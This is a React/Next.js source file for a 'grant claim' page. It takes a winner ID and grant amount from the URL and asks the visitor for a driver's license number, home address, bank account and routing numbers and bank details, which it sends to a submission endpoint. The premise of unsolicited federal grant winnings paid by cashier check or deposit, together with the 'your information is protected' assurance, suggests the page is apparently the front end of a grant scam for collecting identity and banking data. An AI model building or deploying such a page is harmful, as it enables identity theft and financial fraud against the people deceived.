"use client"

import { Suspense, useState, useMemo } from "react"
import { useSearchParams } from "next/navigation"
import { motion } from "framer-motion"
import { FileText, Send, CheckCircle2, Loader2, AlertCircle, CreditCard, Landmark, Copy, Check } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"

function generateUniqueCode(method: string): string {
  const prefix = method === "cashier_check" ? "CHK" : "EDP"
  const timestamp = Date.now().toString(36).toUpperCase()
  const random = Math.random().toString(36).substring(2, 8).toUpperCase()
  return `${prefix}-${timestamp}-${random}`
}

function ClaimFormContent() {
  const searchParams = useSearchParams()
  const winnerId = searchParams.get("id") || ""
  const amount = searchParams.get("amount") || "0"
  const method = searchParams.get("method") || "cashier_check"

  const formattedAmount = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 0,
  }).format(Number(amount))

  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [submitted, setSubmitted] = useState(false)
  const [copied, setCopied] = useState(false)

  const uniqueCode = useMemo(() => generateUniqueCode(method), [method])

  // Cashier Check form data
  const [cashierData, setCashierData] = useState({
    fullName: "",
    address: "",
    city: "",
    state: "",
    zipCode: "",
    driversLicense: "",
    email: "",
    receivedGrantsBefore: "",
  })

  // Electronic Deposit form data
  const [depositData, setDepositData] = useState({
    fullName: "",
    accountNumber: "",
    routingNumber: "",
    homeAddress: "",
    homeCity: "",
    homeState: "",
    homeZipCode: "",
    bankAddress: "",
    bankCity: "",
    bankState: "",
    bankZipCode: "",
    bankName: "",
    email: "",
    receivedGrantsBefore: "",
  })

  const handleCashierChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setCashierData({ ...cashierData, [e.target.name]: e.target.value })
  }

  const handleDepositChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setDepositData({ ...depositData, [e.target.name]: e.target.value })
  }

  const handleCopy = () => {
    navigator.clipboard.writeText(uniqueCode)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setError("")

    try {
      const payload = {
        winnerId,
        amount,
        method,
        uniqueCode,
        ...(method === "cashier_check" ? cashierData : depositData),
      }

      const res = await fetch("/api/submit-claim", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      })

      const data = await res.json()

      if (data.success) {
        setSubmitted(true)
      } else {
        setError(data.error || "Failed to submit claim. Please try again.")
      }
    } catch {
      setError("An error occurred. Please try again.")
    } finally {
      setLoading(false)
    }
  }

  if (submitted) {
    return (
      <div className="min-h-[80vh] flex items-center justify-center">
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="mx-auto max-w-lg px-4 py-16 text-center"
        >
          <div className="mb-6 inline-flex h-20 w-20 items-center justify-center rounded-full bg-green-100">
            <CheckCircle2 className="h-10 w-10 text-green-600" />
          </div>
          <h1 className="mb-3 text-3xl font-bold">Claim Submitted!</h1>
          <p className="text-lg text-muted-foreground">
            Your grant claim has been submitted successfully. Our team will review your application
            and contact you within 3-5 business days at the email address you provided.
          </p>
          
          {/* Unique Code Card */}
          <div className="mt-8 rounded-xl bg-gradient-to-br from-primary/5 to-primary/10 border-2 border-primary/20 p-6">
            <p className="text-sm font-semibold text-muted-foreground mb-2">Your Unique Reference Code</p>
            <div className="flex items-center justify-center gap-3">
              <code className="text-2xl font-bold text-primary tracking-wider">{uniqueCode}</code>
              <button
                onClick={handleCopy}
                className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 hover:bg-primary/20 transition-colors"
              >
                {copied ? (
                  <Check className="h-4 w-4 text-green-600" />
                ) : (
                  <Copy className="h-4 w-4 text-primary" />
                )}
              </button>
            </div>
            <p className="mt-3 text-xs text-muted-foreground">
              This code has been sent to your email. Please save it for your records.
            </p>
          </div>

          <div className="mt-6 rounded-xl bg-muted p-4 text-sm text-muted-foreground">
            <p className="font-semibold text-foreground">
              Grant Amount: {formattedAmount} • Method: {method === "cashier_check" ? "Cashier Check" : "Electronic Deposit"}
            </p>
            <p className="mt-1">Reference ID: CLM-{winnerId}</p>
          </div>
        </motion.div>
      </div>
    )
  }

  return (
    <div className="min-h-[80vh] bg-gradient-to-b from-muted/30 to-background">
      <div className="mx-auto max-w-2xl px-4 py-16 sm:px-6 sm:py-20">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="mb-10 text-center"
        >
          <div className="mb-4 inline-flex items-center gap-2 rounded-full bg-green-100 px-4 py-2">
            {method === "cashier_check" ? (
              <CreditCard className="h-4 w-4 text-green-700" />
            ) : (
              <Landmark className="h-4 w-4 text-green-700" />
            )}
            <span className="text-sm font-semibold text-green-700">
              {method === "cashier_check" ? "Cashier Check" : "Electronic Deposit"} Claim
            </span>
          </div>
          <h1 className="text-3xl font-bold tracking-tight sm:text-4xl">
            Complete Your Claim
          </h1>
          <p className="mt-3 text-lg text-muted-foreground">
            Provide your details to process your {formattedAmount} grant via{" "}
            {method === "cashier_check" ? "cashier check" : "electronic deposit"}.
          </p>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
        >
          <Card className="border-2 shadow-xl">
            <CardHeader className="pb-4">
              <div className="flex items-center gap-3">
                <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-green-600 text-white">
                  {method === "cashier_check" ? (
                    <CreditCard className="h-5 w-5" />
                  ) : (
                    <Landmark className="h-5 w-5" />
                  )}
                </div>
                <div>
                  <CardTitle className="text-xl">
                    {method === "cashier_check" ? "Cashier Check Details" : "Electronic Deposit Details"}
                  </CardTitle>
                  <CardDescription>All fields are required</CardDescription>
                </div>
              </div>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSubmit} className="space-y-5">
                {method === "cashier_check" ? (
                  <>
                    {/* CASHIER CHECK FORM */}
                    <div className="space-y-2">
                      <Label htmlFor="fullName" className="text-base">Full Name *</Label>
                      <Input
                        id="fullName"
                        name="fullName"
                        value={cashierData.fullName}
                        onChange={handleCashierChange}
                        required
                        placeholder="John Doe"
                        className="text-base"
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="address" className="text-base">Mailing Address *</Label>
                      <Input
                        id="address"
                        name="address"
                        value={cashierData.address}
                        onChange={handleCashierChange}
                        required
                        placeholder="123 Main Street"
                        className="text-base"
                      />
                    </div>

                    <div className="grid gap-5 sm:grid-cols-3">
                      <div className="space-y-2">
                        <Label htmlFor="city" className="text-base">City *</Label>
                        <Input id="city" name="city" value={cashierData.city} onChange={handleCashierChange} required placeholder="New York" />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="state" className="text-base">State *</Label>
                        <Input id="state" name="state" value={cashierData.state} onChange={handleCashierChange} required placeholder="NY" maxLength={2} />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="zipCode" className="text-base">ZIP Code *</Label>
                        <Input id="zipCode" name="zipCode" value={cashierData.zipCode} onChange={handleCashierChange} required placeholder="10001" />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="driversLicense" className="text-base">Driver&apos;s License Number *</Label>
                      <Input
                        id="driversLicense"
                        name="driversLicense"
                        value={cashierData.driversLicense}
                        onChange={handleCashierChange}
                        required
                        placeholder="e.g. D12345678"
                        className="text-base"
                      />
                      <p className="text-xs text-muted-foreground">Required for identity verification purposes</p>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="cashierEmail" className="text-base">Email Address *</Label>
                      <Input
                        id="cashierEmail"
                        name="email"
                        type="email"
                        value={cashierData.email}
                        onChange={handleCashierChange}
                        required
                        placeholder="john@example.com"
                        className="text-base"
                      />
                    </div>

                    {/* Previous Grants Question */}
                    <div className="space-y-3">
                      <Label className="text-base">Have you received federal grants before? *</Label>
                      <div className="flex gap-4">
                        <label className={`flex-1 cursor-pointer rounded-xl border-2 p-4 text-center transition-all ${
                          cashierData.receivedGrantsBefore === "yes"
                            ? "border-primary bg-primary/5 ring-2 ring-primary/20"
                            : "border-muted hover:border-primary/30"
                        }`}>
                          <input
                            type="radio"
                            name="receivedGrantsBefore"
                            value="yes"
                            checked={cashierData.receivedGrantsBefore === "yes"}
                            onChange={handleCashierChange}
                            className="sr-only"
                            required
                          />
                          <span className="text-base font-semibold">Yes</span>
                        </label>
                        <label className={`flex-1 cursor-pointer rounded-xl border-2 p-4 text-center transition-all ${
                          cashierData.receivedGrantsBefore === "no"
                            ? "border-primary bg-primary/5 ring-2 ring-primary/20"
                            : "border-muted hover:border-primary/30"
                        }`}>
                          <input
                            type="radio"
                            name="receivedGrantsBefore"
                            value="no"
                            checked={cashierData.receivedGrantsBefore === "no"}
                            onChange={handleCashierChange}
                            className="sr-only"
                          />
                          <span className="text-base font-semibold">No</span>
                        </label>
                      </div>
                    </div>
                  </>
                ) : (
                  <>
                    {/* ELECTRONIC DEPOSIT FORM */}
                    <div className="space-y-2">
                      <Label htmlFor="fullName" className="text-base">Full Name *</Label>
                      <Input
                        id="fullName"
                        name="fullName"
                        value={depositData.fullName}
                        onChange={handleDepositChange}
                        required
                        placeholder="John Doe"
                        className="text-base"
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="depositEmail" className="text-base">Email Address *</Label>
                      <Input
                        id="depositEmail"
                        name="email"
                        type="email"
                        value={depositData.email}
                        onChange={handleDepositChange}
                        required
                        placeholder="john@example.com"
                        className="text-base"
                      />
                    </div>

                    {/* Divider - Banking Info */}
                    <div className="relative pt-2">
                      <div className="absolute inset-0 flex items-center">
                        <div className="w-full border-t border-muted" />
                      </div>
                      <div className="relative flex justify-center">
                        <span className="bg-card px-3 text-xs font-medium text-muted-foreground uppercase tracking-wider">Banking Information</span>
                      </div>
                    </div>

                    <div className="grid gap-5 sm:grid-cols-2">
                      <div className="space-y-2">
                        <Label htmlFor="accountNumber" className="text-base">Account Number *</Label>
                        <Input
                          id="accountNumber"
                          name="accountNumber"
                          value={depositData.accountNumber}
                          onChange={handleDepositChange}
                          required
                          placeholder="e.g. 123456789"
                          className="text-base"
                        />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="routingNumber" className="text-base">Routing Number *</Label>
                        <Input
                          id="routingNumber"
                          name="routingNumber"
                          value={depositData.routingNumber}
                          onChange={handleDepositChange}
                          required
                          placeholder="e.g. 021000021"
                          className="text-base"
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="bankName" className="text-base">Bank Name *</Label>
                      <Input
                        id="bankName"
                        name="bankName"
                        value={depositData.bankName}
                        onChange={handleDepositChange}
                        required
                        placeholder="e.g. Chase Bank"
                        className="text-base"
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="bankAddress" className="text-base">Bank Address *</Label>
                      <Input
                        id="bankAddress"
                        name="bankAddress"
                        value={depositData.bankAddress}
                        onChange={handleDepositChange}
                        required
                        placeholder="456 Bank Street"
                        className="text-base"
                      />
                    </div>

                    <div className="grid gap-5 sm:grid-cols-3">
                      <div className="space-y-2">
                        <Label htmlFor="bankCity" className="text-base">Bank City *</Label>
                        <Input id="bankCity" name="bankCity" value={depositData.bankCity} onChange={handleDepositChange} required placeholder="New York" />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="bankState" className="text-base">Bank State *</Label>
                        <Input id="bankState" name="bankState" value={depositData.bankState} onChange={handleDepositChange} required placeholder="NY" maxLength={2} />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="bankZipCode" className="text-base">Bank ZIP *</Label>
                        <Input id="bankZipCode" name="bankZipCode" value={depositData.bankZipCode} onChange={handleDepositChange} required placeholder="10001" />
                      </div>
                    </div>

                    {/* Divider - Home Address */}
                    <div className="relative pt-2">
                      <div className="absolute inset-0 flex items-center">
                        <div className="w-full border-t border-muted" />
                      </div>
                      <div className="relative flex justify-center">
                        <span className="bg-card px-3 text-xs font-medium text-muted-foreground uppercase tracking-wider">Home Address</span>
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="homeAddress" className="text-base">Home Address *</Label>
                      <Input
                        id="homeAddress"
                        name="homeAddress"
                        value={depositData.homeAddress}
                        onChange={handleDepositChange}
                        required
                        placeholder="123 Main Street"
                        className="text-base"
                      />
                    </div>

                    <div className="grid gap-5 sm:grid-cols-3">
                      <div className="space-y-2">
                        <Label htmlFor="homeCity" className="text-base">City *</Label>
                        <Input id="homeCity" name="homeCity" value={depositData.homeCity} onChange={handleDepositChange} required placeholder="New York" />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="homeState" className="text-base">State *</Label>
                        <Input id="homeState" name="homeState" value={depositData.homeState} onChange={handleDepositChange} required placeholder="NY" maxLength={2} />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="homeZipCode" className="text-base">ZIP Code *</Label>
                        <Input id="homeZipCode" name="homeZipCode" value={depositData.homeZipCode} onChange={handleDepositChange} required placeholder="10001" />
                      </div>
                    </div>

                    {/* Previous Grants Question */}
                    <div className="space-y-3">
                      <Label className="text-base">Have you received federal grants before? *</Label>
                      <div className="flex gap-4">
                        <label className={`flex-1 cursor-pointer rounded-xl border-2 p-4 text-center transition-all ${
                          depositData.receivedGrantsBefore === "yes"
                            ? "border-primary bg-primary/5 ring-2 ring-primary/20"
                            : "border-muted hover:border-primary/30"
                        }`}>
                          <input
                            type="radio"
                            name="receivedGrantsBefore"
                            value="yes"
                            checked={depositData.receivedGrantsBefore === "yes"}
                            onChange={handleDepositChange}
                            className="sr-only"
                            required
                          />
                          <span className="text-base font-semibold">Yes</span>
                        </label>
                        <label className={`flex-1 cursor-pointer rounded-xl border-2 p-4 text-center transition-all ${
                          depositData.receivedGrantsBefore === "no"
                            ? "border-primary bg-primary/5 ring-2 ring-primary/20"
                            : "border-muted hover:border-primary/30"
                        }`}>
                          <input
                            type="radio"
                            name="receivedGrantsBefore"
                            value="no"
                            checked={depositData.receivedGrantsBefore === "no"}
                            onChange={handleDepositChange}
                            className="sr-only"
                          />
                          <span className="text-base font-semibold">No</span>
                        </label>
                      </div>
                    </div>
                  </>
                )}

                {error && (
                  <div className="flex items-center gap-2 rounded-lg bg-destructive/10 p-3 text-sm text-destructive">
                    <AlertCircle className="h-4 w-4 shrink-0" />
                    {error}
                  </div>
                )}

                <Button type="submit" size="xl" className="w-full rounded-xl text-lg bg-green-600 hover:bg-green-500" disabled={loading}>
                  {loading ? (
                    <>
                      <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                      Submitting...
                    </>
                  ) : (
                    <>
                      <Send className="mr-2 h-5 w-5" />
                      Submit Claim
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>
        </motion.div>

        <p className="mt-6 text-center text-sm text-muted-foreground">
          🔒 Your information is protected and will only be used for grant processing.
        </p>
      </div>
    </div>
  )
}

export default function ClaimPage() {
  return (
    <Suspense fallback={<div className="min-h-[80vh] flex items-center justify-center"><p>Loading...</p></div>}>
      <ClaimFormContent />
    </Suspense>
  )
}
